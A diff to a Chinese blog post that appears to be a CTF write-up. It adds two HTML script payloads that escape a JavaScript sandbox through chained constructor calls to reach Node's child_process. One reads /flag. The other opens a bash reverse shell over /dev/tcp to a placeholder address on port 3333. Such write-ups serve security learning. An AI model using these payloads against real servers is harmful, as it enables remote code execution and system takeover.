@@ -254,7 +254,13 @@ var Troy3e = new XMLHttpRequest();Troy3e.open(&quot;GET&quot;, &quot;http://127.
 <p>再用自己的url发一次包</p>
 <p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021171005.png" alt></p>
 <p>最后在第一次发的包那里重定向即可更新bucket，访问/user/bucket即可反弹shell。</p>
-
+<p>读flag</p>
+<pre><code>&lt;script&gt;
+a=this.constructor.constructor.constructor.constructor(&#39;return process&#39;)();b=a.mainModule.require(&#39;child_process&#39;);c=b.execSync(&#39;cat /flag&#39;).toString();document.write(c);
+&lt;/script&gt;
+</code></pre><p>弹shell</p>
+<pre><code>&lt;script&gt;c=&#39;constructor&#39;;this[c][c](&quot;c=&#39;constructor&#39;;require=this[c][c](&#39;return process&#39;)().mainModule.require;var sync=require(&#39;child_process&#39;).spawnSync; var ls = sync(&#39;bash&#39;, [&#39;-c&#39;,&#39;bash -i &gt;&amp; /dev/tcp/x.x.x.x/3333 0&gt;&amp;1&#39;],);console.log(ls.output.toString());&quot;)()&lt;/script&gt;
+</code></pre>
         </div>
         <!-- .entry-content -->
         <div class="single-reward">
